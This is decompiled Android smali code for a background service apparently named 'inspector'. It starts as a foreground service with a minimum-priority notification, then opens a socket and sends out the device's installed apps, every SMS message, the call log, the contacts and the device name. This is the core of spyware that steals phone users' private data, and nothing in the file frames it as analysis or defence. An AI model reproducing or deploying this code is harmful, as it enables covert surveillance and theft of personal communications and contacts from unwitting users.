.class public final Lthisisme/thisapp/inspector/MainService;
.super Landroid/app/Service;
.source "MainService.kt"


# annotations
.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000,\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\u0008\n\u0002\u0008\u0004\u0008\u0007\u0018\u00002\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0008\u0010\u0003\u001a\u00020\u0004H\u0003J\u0014\u0010\u0005\u001a\u0004\u0018\u00010\u00062\u0008\u0010\u0007\u001a\u0004\u0018\u00010\u0008H\u0016J\u0008\u0010\t\u001a\u00020\nH\u0016J\"\u0010\u000b\u001a\u00020\u000c2\u0008\u0010\r\u001a\u0004\u0018\u00010\u00082\u0006\u0010\u000e\u001a\u00020\u000c2\u0006\u0010\u000f\u001a\u00020\u000cH\u0016\u00a8\u0006\u0010"
    }
    d2 = {
        "Lthisisme/thisapp/inspector/MainService;",
        "Landroid/app/Service;",
        "()V",
        "getNotification",
        "Landroid/app/Notification;",
        "onBind",
        "Landroid/os/IBinder;",
        "p0",
        "Landroid/content/Intent;",
        "onCreate",
        "",
        "onStartCommand",
        "",
        "intent",
        "flags",
        "startId",
        "app_debug"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I


# direct methods
.method static constructor <clinit>()V
    .locals 1

    sget-object v0, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->INSTANCE:Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->Int$class-MainService()I

    move-result v0

    sput v0, Lthisisme/thisapp/inspector/MainService;->$stable:I

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 12
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private final getNotification()Landroid/app/Notification;
    .locals 9

    .line 36
    sget-object v0, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->INSTANCE:Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->String$val-channelId$fun-getNotification$class-MainService()Ljava/lang/String;

    move-result-object v0

    .line 37
    .local v0, "channelId":Ljava/lang/String;
    sget-object v1, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->INSTANCE:Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->String$val-channelName$fun-getNotification$class-MainService()Ljava/lang/String;

    move-result-object v1

    .line 38
    .local v1, "channelName":Ljava/lang/String;
    new-instance v2, Landroid/app/NotificationChannel;

    .line 39
    nop

    .line 40
    move-object v3, v1

    check-cast v3, Ljava/lang/CharSequence;

    .line 41
    nop

    .line 38
    const/4 v4, 0x1

    invoke-direct {v2, v0, v3, v4}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 43
    .local v2, "channel":Landroid/app/NotificationChannel;
    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    .line 44
    const-string v3, "notification"

    invoke-virtual {p0, v3}, Lthisisme/thisapp/inspector/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    if-eqz v3, :cond_0

    check-cast v3, Landroid/app/NotificationManager;

    .line 45
    .local v3, "manager":Landroid/app/NotificationManager;
    invoke-virtual {v3, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 46
    new-instance v4, Landroidx/core/app/NotificationCompat$Builder;

    move-object v5, p0

    check-cast v5, Landroid/content/Context;

    invoke-direct {v4, v5, v0}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 47
    .local v4, "notificationBuilder":Landroidx/core/app/NotificationCompat$Builder;
    sget-object v5, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->INSTANCE:Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;

    invoke-virtual {v5}, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->Boolean$arg-0$call-setOngoing$$this$call-setSmallIcon$$this$call-setContentTitle$$this$call-setPriority$$this$call-setCustomBigContentView$$this$call-build$fun-getNotification$class-MainService()Z

    move-result v5

    invoke-virtual {v4, v5}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    .line 48
    const v6, 0x7f07006a

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    .line 49
    sget-object v6, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->INSTANCE:Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;

    invoke-virtual {v6}, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->String$arg-0$call-setContentTitle$$this$call-setPriority$$this$call-setCustomBigContentView$$this$call-build$fun-getNotification$class-MainService()Ljava/lang/String;

    move-result-object v6

    check-cast v6, Ljava/lang/CharSequence;

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    .line 50
    const/16 v6, -0x3e8

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    .line 51
    new-instance v6, Landroid/widget/RemoteViews;

    invoke-virtual {p0}, Lthisisme/thisapp/inspector/MainService;->getPackageName()Ljava/lang/String;

    move-result-object v7

    const v8, 0x7f0c002d

    invoke-direct {v6, v7, v8}, Landroid/widget/RemoteViews;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setCustomBigContentView(Landroid/widget/RemoteViews;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    .line 52
    invoke-virtual {v5}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v5

    const-string v6, "notificationBuilder.setO\u2026on))\n            .build()"

    invoke-static {v5, v6}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 47
    return-object v5

    .line 44
    .end local v3    # "manager":Landroid/app/NotificationManager;
    .end local v4    # "notificationBuilder":Landroidx/core/app/NotificationCompat$Builder;
    :cond_0
    new-instance v3, Ljava/lang/NullPointerException;

    const-string v4, "null cannot be cast to non-null type android.app.NotificationManager"

    invoke-direct {v3, v4}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v3
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "p0"    # Landroid/content/Intent;

    .line 14
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 2

    .line 30
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 31
    sget-object v0, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->INSTANCE:Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/LiveLiterals$MainServiceKt;->Int$arg-0$call-startForeground$fun-onCreate$class-MainService()I

    move-result v0

    invoke-direct {p0}, Lthisisme/thisapp/inspector/MainService;->getNotification()Landroid/app/Notification;

    move-result-object v1

    invoke-virtual {p0, v0, v1}, Lthisisme/thisapp/inspector/MainService;->startForeground(ILandroid/app/Notification;)V

    .line 32
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .line 18
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppSocket;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    invoke-direct {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppSocket;-><init>(Landroid/content/Context;)V

    .line 19
    .local v0, "socket":Lthisisme/thisapp/inspector/Utils/AppSocket;
    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->getAction()Lthisisme/thisapp/inspector/Utils/AppActions;

    move-result-object v1

    .line 20
    .local v1, "action":Lthisisme/thisapp/inspector/Utils/AppActions;
    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->connect()V

    .line 21
    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendApps()V

    .line 22
    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendAllSms()V

    .line 23
    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendCallLog()V

    .line 24
    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendContact()V

    .line 25
    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendDeviceName()V

    .line 26
    const/4 v2, 0x1

    return v2
.end method
